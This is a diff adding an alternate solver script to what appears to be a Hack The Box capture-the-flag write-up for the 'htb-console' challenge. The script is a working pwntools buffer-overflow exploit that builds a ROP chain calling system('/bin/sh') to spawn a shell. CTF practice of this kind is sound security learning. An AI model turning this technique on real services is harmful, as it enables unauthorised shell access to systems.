@@ -195,4 +195,69 @@ sh.interactive()
 HTB{fl@g_a$_a_s3rv1c3?}
 ```
 
+## ALTERNATE SCRIPT
+
+1. Here lies my alternate solver, but it failed locally and needed to run remotely to get the flag.
+
+> THE SCRIPT
+
+```py
+import os
+from pwn import *
+
+os.system('clear')
+
+def start(argv=[], *a, **kw):
+    if args.REMOTE:
+        return remote(sys.argv[1], sys.argv[2], *a, **kw)
+    else:
+        return process([exe] + argv, *a, **kw)
+
+exe = './htb-console'
+elf = context.binary = ELF(exe, checksec=True)
+context.log_level = 'debug'
+
+sh = start()
+
+padding = 24
+system_addr = elf.sym['system']
+info('System Address --> %#0x', system_addr)
+
+pop_rdi_gadget = 0x0000000000401473
+info('pop_rdi_gadget --> %#0x', pop_rdi_gadget)
+
+ret_addr = 0x000000000040101a
+info('ret_addr --> %#0x', ret_addr)
+
+sh.sendlineafter(b'>>', b'hof')
+'''
+p = flat([
+    asm('nop') * padding,
+    ret_addr,
+    pop_rdi_gadget,
+    b'/bin/sh\x00',
+    system_addr
+])
+'''
+#sh.sendlineafter(b':', p)
+
+data_addr = 0x004040b0
+info('Dat Addr --> %#0x', data_addr)
+
+pay = flat([
+    asm('nop') * padding,
+    #ret_addr,
+    pop_rdi_gadget,
+    data_addr,
+    system_addr
+])
+
+sh.sendlineafter(b':', b'/bin/sh\x00')
+sh.sendlineafter(b'>>', b'flag')
+sh.sendlineafter(b':', pay)
+
+sh.interactive() # get shell
+```
+
+
 
